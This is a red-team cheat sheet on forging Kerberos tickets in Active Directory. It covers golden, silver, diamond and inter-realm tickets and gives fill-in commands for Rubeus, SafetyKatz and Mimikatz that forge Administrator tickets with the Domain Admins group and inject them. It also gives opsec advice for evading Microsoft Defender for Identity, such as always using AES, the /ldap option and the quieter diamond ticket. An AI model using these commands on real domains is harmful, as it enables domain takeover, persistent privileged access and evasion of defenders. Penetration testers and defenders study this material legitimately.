# Ticket Forging

{% hint style="info" %}
Always assume that MDI is active on Domain Controller

Always use AES to improve opsec

Make sure that the ticket you are forging is compliant to the KRBTGT policy
{% endhint %}

## Golden Ticket

### Theory

With the ash of the krbtgt account a ticket can be manually crafted (forged) with arbitrary parameter\
(i.e. Domain Admin)

### Abuse

With rubeus you can specify the option `/ldap` to do the majority of the opsec things

{% code overflow="wrap" %}
```powershell
./Rubeus.exe golden /aes256:<$AES256> /sid:<$SID> /ldap /User:Administrator /printcmd
```
{% endcode %}

## Silver Ticket

### Theory

Used to forge a ticket for a service account or a machine account. This ticket is not so useful as persistece because the machine passwords are rotated every 30 days

### Abuse

A silver ticket can be forged with tool like safetykatz

{% code overflow="wrap" %}
```powershell
./SafetyKatz.exe '"kerberos::golden /User:Administrator /domain:<$Domain Name> /sid:<$SID> /target:<$Machine name> /service:cifs /aes:<$AES256> /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
```
{% endcode %}

## Diamond Ticket

### Theory

An even more opsec friendly version of the golden ticket. Usually with a golden ticket you craft a TGT without requesting it previously, so when you use it will flag the defensive mechanism.

To forge it you have to decrypt a valid ticket, modify and incypt it again with the krbtgt hash

### Abuse

Using rubeus

{% code overflow="wrap" %}
```powershell
./Rubeus.exe diamond /krbkey:<$AES> /user:<$Controlled user> /Password:<$Password> /enctype:aes /ticketuser:administrator /domain:<$Domain> /dc:<$DC> /ticketuserid:500 /groups:512 /createonly:C:\Windows\System32\cmd.exe /show /ptt
```
{% endcode %}

You can also use `/tgtdel` instead of the credentials if you have access to a domain user



and now you can [pass-the-hash.md](../active-directory/lateral-movement/pass-the/pass-the-hash.md "mention") to execute commands

## Inter-Realm Ticket

{% code overflow="wrap" %}
```powershell
kerberos::golden /user:Administrator /domain:<CURRENT DOMAIN> /sid:<CURRENT DOMAIN SID> /sids:<SID TO EXTRACT> /rc4:<TRUST KEY> /service:krbtgt /target:<TARGET DOMAIN> /ticket:./trust_tkt.kirbi" 
```
{% endcode %}

<figure><img src="../../.gitbook/assets/Pasted image 20231113155053.png" alt=""><figcaption></figcaption></figure>
